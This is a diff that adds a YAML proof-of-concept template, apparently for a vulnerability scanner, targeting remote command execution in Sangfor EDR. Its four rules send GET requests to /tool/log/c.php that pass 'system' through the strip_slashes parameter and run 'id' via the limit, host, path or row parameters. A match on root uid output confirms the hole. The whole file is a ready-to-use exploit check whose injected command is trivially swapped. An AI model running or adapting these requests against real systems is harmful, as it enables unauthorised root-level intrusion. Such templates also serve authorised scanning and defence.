@@ -1,0 +1,39 @@
+name: poc-yaml-sangfor-EDR-rce
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /tool/log/c.php?strip_slashes=system&limit=id
+            follow_redirects: false
+        expression: response.status == 200 && "uid=0(root) gid=0(root) groups=0".bmatches(response.body)
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /tool/log/c.php?strip_slashes=system&host=id
+            follow_redirects: false
+        expression: response.status == 200 && "uid=0(root) gid=0(root) groups=0".bmatches(response.body)
+
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /tool/log/c.php?strip_slashes=system&path=id 
+            follow_redirects: false
+        expression: response.status == 200 && "uid=0(root) gid=0(root) groups=0".bmatches(response.body)
+    r3:
+        request:
+            cache: true
+            method: GET
+            path: /tool/log/c.php?strip_slashes=system&row=id 
+            follow_redirects: false
+        expression: response.status == 200 && "uid=0(root) gid=0(root) groups=0".bmatches(response.body)
+
+expression: r0() || r1() || r2() || r3()
+detail:
+    author: wooluo
+    links:
+        - https://www.sqlsec.com/2020/08/edr.html
